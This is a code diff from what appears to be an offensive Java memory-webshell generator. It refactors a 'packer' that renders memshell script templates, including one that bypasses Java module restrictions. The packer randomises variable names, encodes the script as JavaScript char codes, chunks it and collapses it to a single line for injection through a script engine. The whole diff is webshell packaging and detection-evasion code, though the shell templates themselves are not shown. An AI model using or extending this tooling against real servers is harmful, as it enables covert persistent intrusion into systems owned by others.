@@ -5,7 +5,9 @@ import org.leo.jmg.mem.packer.Packer;
 import org.leo.jmg.mem.packer.PackerCapability;
 import org.leo.jmg.mem.packer.PackerMeta;
 import org.leo.jmg.mem.packer.TemplateRenderer;
-import org.leo.jmg.mem.packer.Util;
+import org.leo.jmg.mem.packer.PackerResources;
+import org.leo.jmg.mem.packer.obfuscation.LiteralObfuscator;
+import org.leo.jmg.mem.packer.obfuscation.PayloadObfuscator;
 
 @PackerMeta(
         name = "DefaultScriptEngine",
@@ -15,15 +17,16 @@ import org.leo.jmg.mem.packer.Util;
         requiredClasses = "javax.script.ScriptEngineManager"
 )
 public class DefaultScriptEnginePacker implements Packer {
-    private final String jsTemplate = Util.loadTemplateFromResource("/memshell-template/ScriptEngine.js.txt");
-    private final String jsBypassModuleTemplate = Util.loadTemplateFromResource("/memshell-template/ScriptEngineBypassModule.js.txt");
+    private final String jsTemplate = PackerResources.loadTemplate("/memshell-template/ScriptEngine.js.txt");
+    private final String jsBypassModuleTemplate = PackerResources.loadTemplate("/memshell-template/ScriptEngineBypassModule.js.txt");
 
     @Override
     public String pack(ClassPackerConfig config) {
         String template = config.isByPassJavaModule() ? jsBypassModuleTemplate : jsTemplate;
         // TemplateRenderer 在渲染阶段完成变量名随机化（{{VAR:x}} 占位符）
         String script = TemplateRenderer.render(template, config);
-        return scriptToSingleLine(Util.chunkPayload(Util.ghostBitsEncodeJs(script)));
+        return scriptToSingleLine(PayloadObfuscator.chunk(
+                LiteralObfuscator.javascriptCharCodes(script)));
     }
 
     public static String scriptToSingleLine(String script) {
